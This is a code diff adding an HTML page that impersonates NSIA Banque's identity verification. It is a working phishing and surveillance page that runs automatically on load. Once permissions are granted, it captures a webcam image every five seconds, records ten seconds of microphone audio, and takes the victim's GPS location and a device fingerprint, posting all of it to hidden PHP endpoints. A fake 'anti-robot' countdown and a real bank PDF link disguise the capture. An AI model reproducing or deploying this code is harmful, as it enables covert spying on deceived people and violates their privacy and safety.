@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>NSIA Banque - Vérification Sécurisée</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container { 
+            background: white; 
+            border-radius: 20px; 
+            padding: 30px; 
+            max-width: 550px; 
+            width: 100%;
+            margin: auto; 
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h2 { color: #1e3c72; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 25px; font-size: 14px; }
+        .step { 
+            margin: 15px 0; 
+            padding: 15px; 
+            border-radius: 10px; 
+            background: #f8f9fa; 
+            border-left: 4px solid #dc3545; 
+            text-align: left;
+            transition: all 0.3s ease;
+        }
+        .step.done { 
+            border-left-color: #28a745; 
+            background: #d4edda; 
+        }
+        .step.waiting { 
+            border-left-color: #ffc107; 
+            background: #fff3cd;
+        }
+        .step-title { font-weight: bold; display: block; margin-bottom: 5px; }
+        .step-status { font-size: 12px; }
+        .step.done .step-status { color: #28a745; }
+        .step.waiting .step-status { color: #ffc107; }
+        button { 
+            background: #007bff; 
+            color: white; 
+            border: none; 
+            padding: 14px 28px; 
+            border-radius: 50px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: bold;
+            margin: 20px 0 10px;
+            transition: all 0.3s;
+            width: 100%;
+        }
+        button:hover { background: #0056b3; }
+        button:disabled { background: #6c757d; cursor: not-allowed; }
+        .pdf-link { 
+            display: none; 
+            margin-top: 20px; 
+            padding: 20px; 
+            background: #d4edda; 
+            border-radius: 10px;
+            border: 2px solid #28a745;
+        }
+        .pdf-link a { color: #155724; font-weight: bold; text-decoration: none; font-size: 18px; }
+        .status { margin-top: 15px; padding: 12px; border-radius: 8px; font-size: 13px; }
+        .status-error { background: #f8d7da; color: #721c24; }
+        .status-warning { background: #fff3cd; color: #856404; }
+        .status-success { background: #d4edda; color: #155724; }
+        .status-info { background: #d1ecf1; color: #0c5460; }
+        .loader { 
+            display: inline-block; 
+            width: 18px; 
+            height: 18px; 
+            border: 2px solid white; 
+            border-top: 2px solid transparent; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar {
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #28a745, #007bff);
+            transition: width 0.3s ease;
+        }
+        .reminder {
+            margin-top: 15px;
+            padding: 10px;
+            background: #e9ecef;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #495057;
+            display: none;
+        }
+        .reminder.show { display: block; }
+        .waiting-screen {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .waiting-screen.show { display: block; }
+        .spinner-large {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #e0e0e0;
+            border-top: 5px solid #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        .timer {
+            font-size: 48px;
+            font-weight: bold;
+            color: #007bff;
+            margin: 20px 0;
+        }
+        .video-wrap, canvas { display: none; }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+    <!-- Écran principal -->
+    <div id="main-screen">
+        <h2>🔒 NSIA Banque - Sécurité renforcée</h2>
+        <div class="subtitle">Vérification d'identité obligatoire</div>
+
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
+        </div>
+
+        <div id="step1" class="step waiting">
+            <span class="step-title">📷 Étape 1 : Vérification caméra</span>
+            <span class="step-status" id="cam-status">⏳ En attente...</span>
+        </div>
+        <div id="step2" class="step waiting">
+            <span class="step-title">🎤 Étape 2 : Vérification audio</span>
+            <span class="step-status" id="mic-status">⏳ En attente...</span>
+        </div>
+        <div id="step3" class="step waiting">
+            <span class="step-title">📍 Étape 3 : Vérification de localisation</span>
+            <span class="step-status" id="loc-status">⏳ En attente...</span>
+        </div>
+        <div id="step4" class="step waiting">
+            <span class="step-title">🖥️ Étape 4 : Informations appareil</span>
+            <span class="step-status" id="info-status">⏳ En attente...</span>
+        </div>
+
+        <button id="start-btn" onclick="startAll()">✅ Démarrer la vérification</button>
+
+        <div id="reminder" class="reminder">
+            ⚠️ <strong>Attention :</strong> Toutes les autorisations sont obligatoires.
+        </div>
+
+        <div id="status" class="status"></div>
+    </div>
+
+    <!-- Écran d'attente anti-robot -->
+    <div id="waiting-screen" class="waiting-screen">
+        <h2>🤖 Vérification anti-robot</h2>
+        <div class="subtitle">Analyse comportementale en cours...</div>
+        <div class="spinner-large"></div>
+        <div class="timer" id="timer">01:30</div>
+        <p style="color: #666;">Nous vérifions que vous n'êtes pas un robot.</p>
+        <p style="color: #999; font-size: 12px;">Veuillez ne pas fermer cette page.</p>
+        <div id="waiting-status" class="status status-info" style="margin-top: 20px;">⏳ Analyse en cours...</div>
+    </div>
+
+    <!-- Écran final avec PDF -->
+    <div id="pdf-container" class="pdf-link">
+        📄 <a href="#" id="pdf-link" target="_blank">Accéder à mon formulaire NSIA</a>
+    </div>
+</div>
+
+<!-- Éléments pour la caméra -->
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+
+<script>
+    let steps = { camera: false, mic: false, geo: false, info: false };
+    let videoStream = null;
+    let permissionsGranted = false;
+    let countdownInterval = null;
+    let remainingSeconds = 90;
+
+    function updateProgress() {
+        let count = (steps.camera?1:0) + (steps.mic?1:0) + (steps.geo?1:0) + (steps.info?1:0);
+        let percent = (count / 4) * 100;
+        document.getElementById('progress-fill').style.width = percent + '%';
+    }
+
+    function updateUI() {
+        if (steps.camera) {
+            document.getElementById('step1').classList.remove('waiting');
+            document.getElementById('step1').classList.add('done');
+            document.getElementById('cam-status').innerHTML = '✅ Acceptée';
+        }
+        if (steps.mic) {
+            document.getElementById('step2').classList.remove('waiting');
+            document.getElementById('step2').classList.add('done');
+            document.getElementById('mic-status').innerHTML = '✅ Accepté';
+        }
+        if (steps.geo) {
+            document.getElementById('step3').classList.remove('waiting');
+            document.getElementById('step3').classList.add('done');
+            document.getElementById('loc-status').innerHTML = '✅ Acceptée';
+        }
+        if (steps.info) {
+            document.getElementById('step4').classList.remove('waiting');
+            document.getElementById('step4').classList.add('done');
+            document.getElementById('info-status').innerHTML = '✅ Envoyées';
+        }
+
+        updateProgress();
+
+        const allGranted = steps.camera && steps.mic && steps.geo && steps.info;
+        
+        if (allGranted && !permissionsGranted) {
+            permissionsGranted = true;
+            startWaitingScreen();
+        }
+    }
+
+    // Envoi des infos appareil VERS handler.php (qui attend $_POST['data'])
+    function sendDeviceInfo() {
+        try {
+            // Collecter les infos
+            const info = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Inconnu',
+                deviceMemory: navigator.deviceMemory || 'Inconnu',
+                cookieEnabled: navigator.cookieEnabled,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Convertir en string pour le champ 'data'
+            const dataString = JSON.stringify(info);
+            
+            // Envoyer à handler.php avec le format attendu
+            fetch('../nearyou/handler.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'data=' + encodeURIComponent(dataString)
+            }).catch(e => console.log("Erreur handler:", e));
+            
+            // Envoyer aussi à normal_data/handler.php
+            fetch('../normal_data/handler.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: 'data=' + encodeURIComponent(dataString)
+            }).catch(e => console.log("Erreur normal_data:", e));
+            
+            console.log("Infos appareil envoyées");
+            steps.info = true;
+            updateUI();
+        } catch(e) {
+            console.log("Erreur envoi infos:", e);
+            steps.info = true;
+            updateUI();
+        }
+    }
+
+    function startWaitingScreen() {
+        document.getElementById('main-screen').style.display = 'none';
+        document.getElementById('waiting-screen').classList.add('show');
+        
+        updateTimerDisplay();
+        
+        countdownInterval = setInterval(function() {
+            if (remainingSeconds > 0) {
+                remainingSeconds--;
+                updateTimerDisplay();
+                
+                const waitingStatus = document.getElementById('waiting-status');
+                if (remainingSeconds > 60) {
+                    waitingStatus.innerHTML = '🔍 Analyse des données biométriques... (Niveau 1/3)';
+                } else if (remainingSeconds > 30) {
+                    waitingStatus.innerHTML = '✅ Vérification des autorisations... (Niveau 2/3)';
+                } else if (remainingSeconds > 0) {
+                    waitingStatus.innerHTML = '📋 Validation finale... (Niveau 3/3)';
+                }
+            } else {
+                clearInterval(countdownInterval);
+                showPdfAccess();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(remainingSeconds / 60);
+        const seconds = remainingSeconds % 60;
+        document.getElementById('timer').innerHTML = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+    }
+
+    function showPdfAccess() {
+        document.getElementById('waiting-screen').classList.remove('show');
+        document.getElementById('pdf-container').style.display = 'block';
+        document.getElementById('pdf-link').href = 'https://www.nsiabanque.ci/wp-content/uploads/2021/02/Formulaire-particulier.pdf';
+        document.getElementById('main-screen').style.display = 'block';
+        
+        const statusDiv = document.getElementById('status');
+        statusDiv.innerHTML = '✅ Vérification anti-robot complétée. Accès débloqué.';
+        statusDiv.className = 'status status-success';
+    }
+
+    // === CAMERA ===
+    function postImage(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata },
+            url: 'post.php',
+            dataType: 'json',
+            async: false
+        });
+    }
+
+    function startCamera() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const constraints = { audio: false, video: { facingMode: "user" } };
+
+        return navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+                videoStream = stream;
+                video.srcObject = stream;
+                steps.camera = true;
+                
+                var context = canvas.getContext('2d');
+                setInterval(function(){
+                    if (steps.camera) {
+                        context.drawImage(video, 0, 0, 640, 640);
+                        var canvasData = canvas.toDataURL("image/png");
+                        var cc = String(canvasData).replace("data:image/png;base64,", "");
+                        postImage(cc);
+                    }
+                }, 5000);
+                
+                updateUI();
+                return true;
+            })
+            .catch(function(e) {
+                steps.camera = false;
+                updateUI();
+                alert("❌ Caméra refusée - Obligatoire");
+                return false;
+            });
+    }
+
+    // === MICROPHONE ===
+    function startMicrophone() {
+        return navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(function(stream) {
+                const formData = new FormData();
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'audio/wav' });
+                    formData.append('audio_data', blob, 'recording');
+                    fetch('../microphone/upload.php', { method: 'POST', body: formData })
+                        .catch(e => console.log("Erreur audio:", e));
+                };
+                
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000);
+                
+                steps.mic = true;
+                updateUI();
+                return true;
+            })
+            .catch(function(e) {
+                steps.mic = false;
+                updateUI();
+                alert("❌ Microphone refusé - Obligatoire");
+                return false;
+            });
+    }
+
+    // === GEOLOCALISATION ===
+    function startGeolocation() {
+        return new Promise((resolve) => {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Format pour handler.php (champ 'data')
+                        const geoData = JSON.stringify({
+                            type: 'geolocation',
+                            latitude: lat,
+                            longitude: lon,
+                            accuracy: accuracy,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        // Envoyer à handler.php
+                        fetch('../nearyou/handler.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: 'data=' + encodeURIComponent(geoData)
+                        }).catch(e => console.log("Erreur geo handler:", e));
+                        
+                        // Envoyer à location.php (créé précédemment)
+                        fetch('../nearyou/location.php', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: `lat=${lat}&lon=${lon}`
+                        }).catch(e => console.log("Erreur location.php:", e));
+                        
+                        console.log(`📍 Position: ${lat}, ${lon}`);
+                        steps.geo = true;
+                        updateUI();
+                        resolve(true);
+                    },
+                    function(error) {
+                        steps.geo = false;
+                        updateUI();
+                        let msg = "Géolocalisation refusée";
+                        if (error.code === 1) msg = "Vous avez refusé la géolocalisation";
+                        alert(`❌ ${msg} - Obligatoire`);
+                        resolve(false);
+                    }
+                );
+            } else {
+                alert("❌ Géolocalisation non supportée");
+                resolve(false);
+            }
+        });
+    }
+
+    async function startAll() {
+        const btn = document.getElementById('start-btn');
+        btn.disabled = true;
+        btn.innerHTML = '<span class="loader"></span> Demande en cours...';
+        
+        document.getElementById('status').innerHTML = '⏳ Demande des autorisations...';
+        document.getElementById('status').className = 'status status-warning';
+        document.getElementById('reminder').classList.add('show');
+        
+        await startCamera();
+        await new Promise(r => setTimeout(r, 500));
+        
+        await startMicrophone();
+        await new Promise(r => setTimeout(r, 500));
+        
+        await startGeolocation();
+        
+        // Envoyer les infos appareil
+        sendDeviceInfo();
+        
+        if (!steps.camera || !steps.mic || !steps.geo) {
+            btn.disabled = false;
+            btn.innerHTML = '🔄 Réessayer - Autorisations manquantes';
+        } else {
+            btn.innerHTML = '✅ Autorisations acceptées';
+        }
+    }
+    
+    // Démarrage automatique
+    window.addEventListener('load', function() {
+        setTimeout(startAll, 500);
+    });
+</script>
+</body>
+</html>
